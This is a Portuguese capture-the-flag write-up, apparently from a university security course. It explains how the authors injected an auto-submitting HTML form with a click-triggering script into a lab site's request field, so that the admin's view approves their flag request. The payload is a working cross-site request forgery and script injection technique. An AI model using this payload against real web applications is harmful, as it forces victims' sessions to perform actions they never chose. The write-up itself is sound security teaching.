# CTF #6 - Apply For a Flag II

Primeiramente, notamos que, quando clicamos no botão **submit**, no site `http://ctf-fsi.fe.up.pt:5004/request`, e no botão **page**, somos redirecionados para o site `http://ctf-fsi.fe.up.pt:5005/request/84da570ff0bfd81b1d9adf6064053920675bf1e3`, em que **84da570ff0bfd81b1d9adf6064053920675bf1e3** é o **id** do pedido, que possui 2 botões que representam as 2 escolhas que o admin pode ter em relação ao pedido da flag: **Give the flag** e **Mark as read**.<br>

Analisando o **html** da página notamos que o botão **Give the flag** está envolvido num **form** da seguinte forma:

```html
<form method="POST" action="/request/84da570ff0bfd81b1d9adf6064053920675bf1e3/approve" role="form">
    <div class="submit">       
        <input type="submit" id="giveflag" value="Give the flag" disabled>       
    </div>
</form>
```

Portanto, para construirmos o nosso ataque, fizemos o seguinte:

- Retiramos a flag **disabled** do input que tem o botão
- Adicionamos `http://ctf-fsi.fe.up.pt:5005` ao início do link da action do form
- Criamos um script que vai clicar no botão com o **id** = **giveflag** e submeter o form logo após o código correr

No final, o form que submetemos no input `Beg for a flag` foi o seguinte:

```html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/84da570ff0bfd81b1d9adf6064053920675bf1e3/approve" role="form">     
	<div class="submit">                  
		<input type="submit" id="giveflag" value="Give the flag">
	</div>  
	<script> 
        document.getElementById("giveflag").click();
    </script>
</form>
```

Por fim, para concluir o nosso ataque, tivemos que desativar o javascript, através das definições do browser, para impedir que fossemos redirecionados.

Após submeter o form alterado no input `Beg for a flag` e desativado o javascript, basta dar refresh à página que a flag estará presente onde costuma estar escrito **Your request hasn't been evaluated yet!**
